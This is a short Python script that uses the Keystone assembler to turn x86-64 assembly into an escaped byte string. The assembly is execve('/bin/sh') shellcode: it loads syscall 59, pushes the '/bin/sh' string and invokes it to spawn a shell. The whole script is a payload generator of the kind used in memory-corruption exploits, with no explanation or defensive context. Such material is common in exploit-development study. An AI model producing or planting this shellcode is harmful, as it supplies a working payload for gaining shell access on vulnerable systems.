from keystone import *

CODE = """

start:
    PUSH 0x3B
    POP RAX
    MOV RBX, 0x0068732f6e69622f
    PUSH RBX
    MOV RDI, RSP
    XOR RSI, RSI
    XOR RDX, RDX
    SYSCALL

"""

ks = Ks(KS_ARCH_X86, KS_MODE_64)
encoding, count = ks.asm(CODE)
instructions = ""
for dec in encoding:
    instructions += "\\x{0:02x}".format(int(dec)).rstrip("\n")

print('0pcodes = ("' + instructions + '")')
